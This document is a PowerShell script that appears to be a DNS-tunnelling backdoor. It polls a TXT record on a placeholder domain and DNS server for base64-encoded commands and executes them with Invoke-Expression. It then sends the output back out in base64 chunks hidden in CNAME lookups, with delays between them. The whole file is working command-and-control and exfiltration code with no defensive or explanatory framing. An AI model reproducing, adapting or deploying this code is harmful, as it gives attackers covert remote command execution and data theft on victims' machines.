$domain = "your_domain.co.il"
$dnsServer = "x.x.x.x"

function Send-CnameQuery {
    param (
        [string]$data
    )
    try {
        nslookup -type=CNAME "$data.$domain" $dnsServer | Out-Null
        Write-Output "Sent CNAME query: $data"
    } catch {
        Write-Output "Failed to send CNAME query: $_"
    }
}

while ($true) {
    try {
        Write-Output "Querying TXT record..."
        $txtOutput = nslookup -type=TXT $domain $dnsServer | Out-String
        if ($txtOutput -match 'text\s*=\s*"(.*?)"') {
            $encodedCommand = $matches[1]
            $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
            Write-Output "Received encoded command: $encodedCommand"
            Write-Output "Decoded command: $decodedCommand"
            
            Write-Output "Executing command..."
            $commandOutput = Invoke-Expression $decodedCommand 2>&1
            Write-Output "Command output: $commandOutput"

            $uniqueId = (Get-Date).ToString("yyyyMMddHHmmss")
            $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($uniqueId + "|" + $commandOutput))

            if ($encodedOutput.Length -le 50) {
                # Send single short response
                Send-CnameQuery "$uniqueId-start"
                Start-Sleep -Milliseconds 200
                Send-CnameQuery "1-chunks"
                Start-Sleep -Milliseconds 200
                Send-CnameQuery "chunk1-$encodedOutput"
                Start-Sleep -Milliseconds 200
                Send-CnameQuery "$uniqueId-end"
            } else {
                # Send long response in chunks
                $chunks = $encodedOutput -split "(.{1,40})" | Where-Object { $_ -ne "" }
                $chunkCount = $chunks.Count

                Send-CnameQuery "$uniqueId-start"
                Start-Sleep -Milliseconds 200
                Send-CnameQuery "$chunkCount-chunks"
                Start-Sleep -Milliseconds 200

                $chunkIndex = 1
                foreach ($chunk in $chunks) {
                    Send-CnameQuery "chunk$chunkIndex-$chunk"
                    Start-Sleep -Milliseconds 9000
                    $chunkIndex++
                }

                Send-CnameQuery "$uniqueId-end"
            }
        } else {
            Write-Output "No TXT record found for command."
        }
    } catch {
        Write-Output "An error occurred: $_"
    }
    Start-Sleep -Seconds 25
}
